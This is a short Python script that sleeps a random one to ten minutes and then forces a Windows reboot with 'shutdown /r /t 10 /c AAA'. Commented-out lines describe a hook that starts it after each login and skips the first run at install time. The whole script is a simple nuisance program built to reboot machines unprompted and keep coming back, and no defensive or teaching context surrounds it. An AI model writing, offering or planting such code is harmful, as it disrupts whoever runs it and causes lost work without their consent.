import time
import random
import os
import sys

# use the start_after_login card
# def start_after_login():
#   ...
#   ...
# exit if the script is being installed
# for the first time so it will only
# start after the next reboot
# if not start_after_login():
#   sys.exit(0)

def reboot():
  n = 60 * random.randint(1,10)
  time.sleep(n)

  # shutdown /r reboots the computer
  #          /t 10 after 10 seconds
  #          /c MESSAGE
  #             show the message
  #             before reboot
  os.system("shutdown /r /t 10 /c AAA")

reboot()
